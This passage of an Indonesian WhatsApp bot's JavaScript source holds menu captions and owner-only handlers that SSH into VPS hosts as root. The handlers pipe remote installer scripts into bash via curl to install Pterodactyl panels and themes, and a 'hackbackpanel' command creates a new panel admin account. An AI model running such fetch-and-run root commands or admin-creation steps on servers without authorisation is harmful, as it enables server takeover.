            imageThumb.resize(jimp.AUTO, 300);
        }
        imageThumb.quality(90);
        const thumbnailBuffer = await imageThumb.getBufferAsync(jimp.MIME_JPEG);

        moment.tz.setDefault('Asia/Jakarta');
        const jam = moment().format('HH:mm');
        const hari = moment().format('dddd, D MMMM YYYY');

        const menuCaption = `\`▧ 𝗥𝗲𝘆𝘇𝗕𝗽𝘁𝘇 ▧\`     
> Hi, I am FyzzBotzz, a simple bot that is ready to help you and drain other tools' features. Glad to be of assistance.        

\`▨ 𝗜 𝗡 𝗙 𝗢 𝗥 𝗠 𝗔 𝗦 𝗜\`
𝗕𝗼𝘁 𝗻𝗮𝗺𝗲 : ${botname}
𝗠𝗼𝗱𝗲 : ${conn.public ? "Public": "Self"}
𝗖𝗿𝗲𝗮𝘁𝗼𝗿 : @${global.owner}
𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : ${global.versi}
𝗥𝘂𝗻𝘁𝗶𝗺𝗲 𝗕𝗼𝘁 : ${runtime(process.uptime())}
𝗨𝗽𝘁𝗶𝗺𝗲 𝗩𝗽𝘀 : ${runtime(os.uptime())}
𝗦𝗽𝗲𝗲𝗱 : ${runtime(os.uptime())}

┏─❖ \`𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂\`
│□ autopromosi
│□ autoread
│□ autoreadsw
│□ autotyping
│□ addowner
│□ addownerall
│□ listowner
│□ delowner
│□ delownerall
│□ self/public
│□ setjeda
│□ setbiobot
│□ setnamabot
│□ clearsession
│□ restartbot
│□ addcase
│□ delcase
│□ getcase
│□ listgc
│□ joingc
│□ joinch
│□ buatgc
│□ spekvps
│□ totalfitur
┗────────────❖
┏─❖ \`𝗣𝗮𝗻𝗲𝗹 𝗠𝗲𝗻𝘂\`
│□ 1gb
│□ 2gb
│□ 3gb
│□ 4gb
│□ 5gb
│□ 6gb
│□ 7gb
│□ 8gb
│□ 9gb
│□ 10gb
│□ unlimited
│□ Cpanel ( Pilih Ram ) 
│□ createserver 
│□ cadp 
│□ cadmin 
│□ delpanel 
│□ delallserver
│□ delalluser
│□ deladmin
│□ delalladmin
│□ listpanel
│□ listadmin
│□ updomain
│□ upapikey
│□ upcapikey
│□ addakses
│□ addreseller
│□ delakses
│□ delreseller
│□ listreseller
│□ resetreseller
│□ totalpanel 
│□ totaladmin 
┗────────────❖
┏─❖ \`𝗣𝗮𝗻𝗲𝗹 𝗠𝗲𝗻𝘂 𝗩𝟮\`
│□ 1gb-v2
│□ 2gb-v2
│□ 3gb-v2
│□ 4gb-v2
│□ 5gb-v2
│□ 6gb-v2
│□ 7gb-v2
│□ 8gb-v2
│□ 9gb-v2
│□ 10gb-v2
│□ unlimited-v2
│□ Cpanel-v2 ( Pilih Ram ) 
│□ createserver2
│□ cadp
│□ cadmin
│□ delpanel-v2
│□ delallserver2
│□ delalluser2
│□ deladmin-v2
│□ delalladmin2
│□ listpanel-v2
│□ listadmin-v2
│□ updomain
│□ upapikey
│□ upcapikey
│□ addakses2
│□ addreseller2
│□ delakses2
│□ delreseller2
│□ listreseller-v2
│□ resetreseller-v2
│□ totalpanel-v2
│□ totaladmin-v2
┗────────────❖
┏─❖ \`𝗦𝘁𝗼𝗿𝗲 𝗠𝗲𝗻𝘂\`
│□ jpmchteks (Teks)
│□ jpmchbutton (Button)
│□ jpmchfoto (Foto)
│□ jpmchvideo (Video)
│□ setbotjpmch (seting on/off)
│□ autojpmch
│□ addteks
│□ delteks
│□ listteks
│□ statusjpmch
│□ jpmchjumlah (Jumlah)
│□ jpmchvip (BuatPtJs)
│□ addptjs (PartnerJs)
│□ delptjs (PartnerJs)
│□ addownjs (OwnerJs)
│□ delownjs (OwnerJs)
│□ addid (Channel)
│□ addidch ( Tanpa Id Channel )
│□ addallid (Semua Id Channel)
│□ delid (Channel)
│□ delallid (Semua Id Channel)
│□ listid (Channel)
│□ seturlsatu (setjpmchbutton)
│□ seturldua (setjpmchbutton)
│□ joinchannel
│□ Payment
┗────────────❖
┏─❖ \`𝗜𝘀𝗹𝗮𝗺 𝗠𝗲𝗻𝘂\`
│□ doa 
│□ sholat on/off
│□ jadwalsholat
│□ asmaulhusna
│□ niatsholat
│□ berdoa
┗────────────❖
┏─❖ \`𝗜𝗻𝘀𝘁𝗮𝗹𝗹 𝗠𝗲𝗻𝘂\`
│□ hackbackpanel
│□ installpanel
│□ installtema
│□ uninstallpanel
│□ uninstalltema
│□ Subdomain
┗────────────❖
┏─❖ \`𝗚𝗿𝗼𝘂𝗽 𝗠𝗲𝗻𝘂\`
│□ add
│□ kick
│□ close
│□ open
│□ hidetag
│□ kudetagc
│□ leave
│□ tagall
│□ antilink
│□ antilink-v2
│□ promote
│□ demote
│□ resetlinkgc
│□ linkgc
│□ bljpm
│□ delbljpm
│□ listdaftarjpm
│□ listonline
│□ listgrup
┗────────────❖
┏─❖ \`𝗗𝗶𝗴𝗶𝘁𝗮𝗹𝗢𝗰𝗲𝗮𝗻 𝗠𝗲𝗻𝘂\`
│□ cvps
│□ sisadroplet
│□ deldroplet
│□ listdroplet
│□ rebuild
│□ restartvps
┗────────────❖
┏─❖ \`𝗢𝘁𝗵𝗲𝗿 𝗠𝗲𝗻𝘂\`
│□ cekidch
│□ cekidgc
│□ reactch
│□ rvo
│□ iqc
│□ qc
│□ hd
│□ stiker
│□ stikerwm
┗────────────❖
┏─❖ \`𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂\`
│□ tourl
│□ berita
│□ ssweb
│□ translate
│□ infogempa
│□ infocuaca
│□ fakechat
│□ shortlink
│□ shortlink-dl
┗────────────❖
┏─❖ \`𝗦𝗲𝗮𝗿𝗰𝗵 𝗠𝗲𝗻𝘂\`
│□ tiktok
│□ tiktokmp3
┗────────────❖
┏─❖ \`𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗠𝗲𝗻𝘂\`
│□ dana
│□ ovo
│□ gopay
│□ qris
┗────────────❖`;

        await conn.sendMessage(m.chat, {
            image: imageBuffer, 
            caption: menuCaption,
            contextInfo: {
                forwardingScore: 1,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: `${global.namaOwner}`,
                    newsletterJid: `120363402682879346@newsletter`,
                },
                externalAdReply: {
                    title: global.botname,
                    body: global.namaOwner,
                    thumbnail: thumbnailBuffer,
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    mentionedJid: [m.sender]
                }
            }
        }, { quoted: fakeStatus });

        // audio lokal
        if (fs.existsSync(audioPath)) {
            const audioMessage = {
                audio: fs.readFileSync(audioPath),
                mimetype: 'audio/mp4',
                ptt: true,
            };
            await conn.sendMessage(m.chat, audioMessage, { quoted: m });
        }

    } catch (error) {
        console.error("Error saat mengirim menu 'allmenu':", error);
        await m.reply("⚠️ Terjadi kesalahan teknis saat menampilkan menu.");
    }
}
break;
//=========================================//
case "help": {
 let teksnya = `Haii @${m.sender.split("@")[0]},
Perkenalkan, saya adalah *${global.botname2}*.

Keunggulan Layanan CS Kami:
✅ Cepat & Responsif – Waktu tanggapan yang optimal untuk kepuasan pelanggan.
✅ Profesional & Ramah – Pelayanan dilakukan dengan etika komunikasi yang baik.
✅ Solusi yang Efektif – Penyelesaian masalah secara tepat dan efisien.
✅ Dukungan Berkelanjutan – Pelanggan dapat terus memperoleh bantuan kapan pun diperlukan.

Hubungi CS KAMI
https://t.me//FixzzCok *[ Tele ]*

Produk KAMI
https://fyzz.store.imey7.com

*#Jika ingin membeli produk silakan hubungi admin kami*
`

 await conn.sendMessage(m.chat, {
 video: fs.readFileSync('./media/allmenu2.mp4'), // <- Video lokal
 caption: teksnya,
 mimetype: 'video/mp4',
 gifPlayback: false,
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: `.menu`,
 buttonText: { displayText: '𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂' },
 type: 1
 },
 {
 buttonId: `.allmenu`,
 buttonText: { displayText: '𝗔𝗹𝗹𝗠𝗲𝗻𝘂' },
 type: 1
 },
 {
 buttonId: `.owner`,
 buttonText: { displayText: '𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿' },
 type: 1
 }
 ],
 headerType: 4, // Khusus video
 contextInfo: {
 mentionedJid: [m.sender]
 }
 }, { quoted: m })
}
break

//=========================================//
case 'menunew': {
    await conn.sendMessage(m.chat, { react: { text: "🔥", key: m.key }});
    const fs = require('fs');
    const moment = require('moment-timezone');
    const jimp = require('jimp');

    const imagePath = './media/allmenu2.jpg'; 
    const thumbnailPath = './media/allmenu.jpg';
    const audioPath = './media/menu.mp3'; // audio 

    try {
        // cek file foto utama
        if (!fs.existsSync(imagePath)) {
            await m.reply("⚠️ File foto './media/allmenu2.jpg' tidak ditemukan di server.");
            return;
        }

        // cek file thumbnail
        if (!fs.existsSync(thumbnailPath)) {
            await m.reply("⚠️ File thumbnail './media/allmenu.jpg' tidak ditemukan di server.");
            return;
        }

        const imageBuffer = fs.readFileSync(imagePath);

        const imageThumb = await jimp.read(thumbnailPath);
        if (imageThumb.bitmap.width > imageThumb.bitmap.height) {
            imageThumb.resize(300, jimp.AUTO);
        } else {
            imageThumb.resize(jimp.AUTO, 300);
        }
        imageThumb.quality(90);
        const thumbnailBuffer = await imageThumb.getBufferAsync(jimp.MIME_JPEG);

        moment.tz.setDefault('Asia/Jakarta');
        const jam = moment().format('HH:mm');
        const hari = moment().format('dddd, D MMMM YYYY');

        const menuCap = `\`▧ 𝗙𝘆𝘇𝘇𝗕𝗼𝘁𝘇𝘇 ▧\`     
> Hi, I am FyzzBotzz, a simple bot that is ready to help you and drain other tools' features. Glad to be of assistance.        

\`▨ 𝗜 𝗡 𝗙 𝗢 𝗥 𝗠 𝗔 𝗦 𝗜\`
𝗕𝗼𝘁 𝗻𝗮𝗺𝗲 : ${botname}
𝗠𝗼𝗱𝗲 : ${conn.public ? "Public": "Self"}
𝗖𝗿𝗲𝗮𝘁𝗼𝗿 : @${global.owner}
𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : ${global.versi}
𝗥𝘂𝗻𝘁𝗶𝗺𝗲 𝗕𝗼𝘁 : ${runtime(process.uptime())}
𝗨𝗽𝘁𝗶𝗺𝗲 𝗩𝗽𝘀 : ${runtime(os.uptime())}
𝗦𝗽𝗲𝗲𝗱 : ${runtime(os.uptime())}

┏─❖ \`𝗡𝗲𝘄 𝗠𝗲𝗻𝘂\`
│□ cvps
│□ sisadroplet
│□ deldroplet
│□ listdroplet
│□ rebuild
│□ restartvps
│□ doa 
│□ sholat on/off
│□ jadwalsholat
│□ asmaulhusna
│□ niatsholat
│□ berdoa
│□ pushkontak 
│□ pushkontak2 
│□ savekontak
│□ savenomer
│□ hackbackpanel
│□ installpanel
│□ installtema
│□ uninstallpanel
│□ uninstalltema
┗────────────❖`;

        await conn.sendMessage(m.chat, {
            image: imageBuffer, 
            caption: menuCap,
            contextInfo: {
                forwardingScore: 1,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: `${global.namaOwner}`,
                    newsletterJid: `120363402682879346@newsletter`,
                },
                externalAdReply: {
                    title: global.botname,
                    body: global.namaOwner,
                    thumbnail: thumbnailBuffer,
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    mentionedJid: [m.sender]
                }
            }
        }, { quoted: fakeStatus });

        // audio lokal
        if (fs.existsSync(audioPath)) {
            const audioMessage = {
                audio: fs.readFileSync(audioPath),
                mimetype: 'audio/mp4',
                ptt: true,
            };
            await conn.sendMessage(m.chat, audioMessage, { quoted: m });
        }

    } catch (error) {
        console.error("Error saat mengirim menu 'allmenu':", error);
        await m.reply("⚠️ Terjadi kesalahan teknis saat menampilkan menu.");
    }
}
break;
//=========================================//
case "uninstalltema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6285609092154\n');
stream.write('https://whatsapp.com/channel/0029VbBC3wJ2Jl8HFyy12s2K\n');
stream.write('https://chat.whatsapp.com/linkgrublu\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installpanel": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))

const ress = new Client();
const connSettings = {
 host: vii[0].trim(),
 port: '22',
 username: 'root',
 password: vii[1].trim()
}

const randomValue1 = getRandom("");
const randomValue2 = getRandom("");
const user = "FyzzNewEraa" + randomValue1;
const pass = "FyzzNewEraa" + randomValue2;
const domainpanel = vii[2].trim();
const domainnode = vii[3].trim();
const ramserver = vii[4].trim();
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
    try {
        ress.exec(commandPanel, (err, stream) => {
            if (err) {
                console.error("❌ Gagal menjalankan commandPanel:", err);
                return m.reply(`❌ Gagal menjalankan commandPanel.\n\n📌 *Detail:*\n${err.message}`);
            }

            stream.on('close', async () => {
                try {
                    ress.exec('bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/main/createnode.sh)', async (err, stream) => {
                        if (err) {
                            console.error("❌ Gagal menjalankan createnode.sh:", err);
                            return m.reply(`❌ Gagal menjalankan createnode.sh.\n\n📌 *Detail:*\n${err.message}`);
                        }

                        stream.on('close', async () => {
                            let teks = `*📦 Berikut Detail Akun Admin Panel:*

* *Username :* ${user}
* *Password :* ${pass}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Dibuat Oleh Bot Untuk Menjalankan Wings.

*Cara Menjalankan Wings:*
ketik *${prefix}startwings* ipvps|pwvps|tokenwings`;
                            await conn.sendMessage(m.chat, { text: teks }, { quoted: qtext });
                        });

                        stream.on('data', async (data) => {
                            console.log(data.toString());
                            if (data.toString().includes("Masukkan nama lokasi: ")) {
                                stream.write('SGP\n');
                            }
                            if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
                                stream.write('FyzzNewEraa\n');
                            }
                            if (data.toString().includes("Masukkan domain: ")) {
                                stream.write(`${domainnode}\n`);
                            }
                            if (data.toString().includes("Masukkan nama node: ")) {
                                stream.write('Node By FyzzOffcial\n');
                            }
                            if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
                                stream.write(`${ramserver}\n`);
                            }
                            if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
                                stream.write(`${ramserver}\n`);
                            }
                            if (data.toString().includes("Masukkan Locid: ")) {
                                stream.write('1\n');
                            }
                        });

                        stream.stderr.on('data', async (data) => {
                            console.error("STDERR:", data.toString());
                        });
                    });
                } catch (error) {
                    console.error("❌ Gagal menjalankan instalWings:", error);
                    m.reply(`❌ Gagal menjalankan instalWings.\n\n📌 *Detail:*\n${error.message}`);
                }
            });

            stream.on('data', async (data) => {
                console.log("Logger:", data.toString());
                if (data.toString().includes('Input 0-6')) {
                    stream.write('1\n');
                }
                if (data.toString().includes('(y/N)')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('Enter the panel address (blank for any address)')) {
                    stream.write(`${domainpanel}\n`);
                }
                if (data.toString().includes('Database host username (pterodactyluser)')) {
                    stream.write(`${user}\n`);
                }
                if (data.toString().includes('Database host password')) {
                    stream.write(`${pass}\n`);
                }
                if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
                    stream.write(`${domainnode}\n`);
                }
                if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
                    stream.write('Fyzz@Fyzz.com\n');
                }
            });

            stream.stderr.on('data', (data) => {
                console.error("STDERR:", data.toString());
            });

        });
    } catch (error) {
        console.error("❌ Gagal menginstall Wings:", error);
        m.reply(`❌ Gagal menginstall Wings.\n\n📌 *Detail:*\n${error.message}`);
    }
}

async function instalPanel() {
    try {
        ress.exec(commandPanel, (err, stream) => {
            if (err) {
                console.error("❌ Gagal menjalankan commandPanel:", err);
                return m.reply(`❌ Gagal menjalankan commandPanel.\n\n📌 *Detail:*\n${err.message}`);
            }

            stream.on('close', async () => {
                try {
                    await instalWings();
                } catch (error) {
                    console.error("❌ Gagal menjalankan instalWings:", error);
                    m.reply(`❌ Gagal menjalankan instalWings.\n\n📌 *Detail:*\n${error.message}`);
                }
            });

            stream.on('data', async (data) => {
                console.log("Logger:", data.toString());

                if (data.toString().includes('Input 0-6')) stream.write('0\n');
                if (data.toString().includes('(y/N)')) stream.write('y\n');
                if (data.toString().includes('Database name (panel)')) stream.write(`${user}\n`);
                if (data.toString().includes('Database username (pterodactyl)')) stream.write(`${user}\n`);
                if (data.toString().includes('Password (press enter to use randomly generated password)')) stream.write(`${pass}\n`);
                if (data.toString().includes('Select timezone [Europe/Stockholm]')) stream.write('Asia/Jakarta\n');
                if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) stream.write('FyzzNewEraa@gmail.com\n');
                if (data.toString().includes('Email address for the initial admin account')) stream.write('FyzzNewEraa@gmail.com\n');
                if (data.toString().includes('Username for the initial admin account')) stream.write(`${user}\n`);
                if (data.toString().includes('First name for the initial admin account')) stream.write('Fyzz\n');
                if (data.toString().includes('Last name for the initial admin account')) stream.write('Fyzz\n');
                if (data.toString().includes('Password for the initial admin account')) stream.write(`${pass}\n`);
                if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) stream.write(`${domainpanel}\n`);
                if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) stream.write('y\n');
                if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) stream.write('y\n');
                if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) stream.write('1\n');
                if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) stream.write('y\n');
                if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) stream.write('y\n');
                if (data.toString().includes('(yes/no)')) stream.write('yes\n');
                if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) stream.write('y\n');
                if (data.toString().includes('Still assume SSL? (y/N)')) stream.write('y\n');
                if (data.toString().includes('Please read the Terms of Service')) stream.write('y\n');
                if (data.toString().includes('(A)gree/(C)ancel:')) stream.write('A\n');
            });

            stream.stderr.on('data', (data) => {
                console.error("STDERR:", data.toString());
            });

        });
    } catch (error) {
        console.error("❌ Gagal menginstall panel:", error);
        m.reply(`❌ Gagal menginstall panel.\n\n📌 *Detail:*\n${error.message}`);
    }
}

ress.on('ready', async () => {
    try {
        await m.reply("Memproses *install panel* \nTunggu 5 menit ke depan hingga proses selesai");

        ress.exec(deletemysql, async (err, stream) => {
            if (err) {
                console.error("❌ Error saat menjalankan deletemysql:", err);
                return m.reply(`❌ Gagal menjalankan perintah deletemysql.\n\n📌 *Detail:*\n${err.message}`);
            }

            stream.on('close', async () => {
                try {
                    await instalPanel();
                } catch (error) {
                    console.error("❌ Gagal menjalankan instalPanel:", error);
                    return m.reply(`❌ Gagal menjalankan instalPanel.\n\n📌 *Detail:*\n${error.message}`);
                }
            });

            stream.on('data', async (data) => {
                console.log("Logger:", data.toString());
                await stream.write('\t');
                await stream.write('\n');
            });

            stream.stderr.on('data', async (data) => {
                console.error("STDERR:", data.toString());
            });
        });

    } catch (error) {
        console.error("❌ Terjadi kesalahan saat memproses install panel:", error);
        return m.reply(`❌ Terjadi kesalahan saat memproses install panel.\n\n📌 *Detail:*\n${error.message}`);
    }
});

try {
    ress.connect(connSettings);
} catch (error) {
    console.error("❌ Gagal menghubungkan ke server:", error);
    m.reply(`❌ Gagal menghubungkan ke server.\n\n📌 *Detail:*\n${error.message}`);
}

}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "subdomain": case "subdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("Fyzz|ipserver"))
if (!text.split("|")) return m.reply(example("Fyzz|ipserver"))
let [host, ip] = text.split("|")
let dom = await Object.keys(global.subdomain)
let list = []
for (let i of dom) {
await list.push({
title: i, 
id: `.domain ${dom.indexOf(i) + 1} ${host}|${ip}`
})
}
await conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Domain',
          sections: [
            {
              title: 'List Domain',
              highlight_label: 'Recommended',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
